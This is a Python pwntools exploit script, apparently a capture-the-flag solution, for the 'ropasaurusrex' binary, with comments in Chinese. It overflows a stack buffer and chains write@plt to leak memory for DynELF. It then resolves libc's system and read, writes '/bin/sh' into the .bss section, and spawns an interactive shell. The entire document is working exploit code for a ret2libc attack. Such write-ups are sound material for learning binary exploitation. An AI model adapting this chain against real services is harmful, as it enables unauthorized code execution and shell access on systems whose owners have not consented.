from pwn import *

proc = process("./ropasaurusrex")

# 读取elf文件
elf = ELF("./ropasaurusrex")

write_plt_addr = elf.symbols["write"]

start_func_addr = 0x8048340
bss_start_addr = 0x8049628

# 可泄漏任意内存的函数
# DynELF 会将调用 leak 从而将 addr 打印出来
def leak(addr):

    p = b'A' * (0x88 + 0x4) 

    p += p32(write_plt_addr)
    p += p32(start_func_addr)

    # wirte arg1, file handle, 1意味着标准输出
    # 此处覆盖的是 main 中的 write 的参数
    p += p32(1)
    # write arg2, buf缓冲区地址
    p += p32(addr)
    # write arg3, 要写入的字节数
    p += p32(4)

    proc.sendline(p)

    # 接收 write 的输出
    content = proc.recv(4)
    return content

d = DynELF(leak, elf = elf)

system_addr = d.lookup('system', 'libc')
read_addr = d.lookup('read', 'libc')

print("system_addr: %s" % system_addr)
print("read_addr: %s" % read_addr)

p = b'A' * (0x88 + 0x4) 
p += p32(read_addr)
p += p32(system_addr)

# read arg1, file handle, 0意味着标准输入
p += p32(0)
# read arg2, 数据保存的地址
p += p32(bss_start_addr)
# read arg3, 数据的长度
p += p32(8)

proc.sendline(p)
proc.sendline(b'/bin/sh\x00')
proc.interactive()




    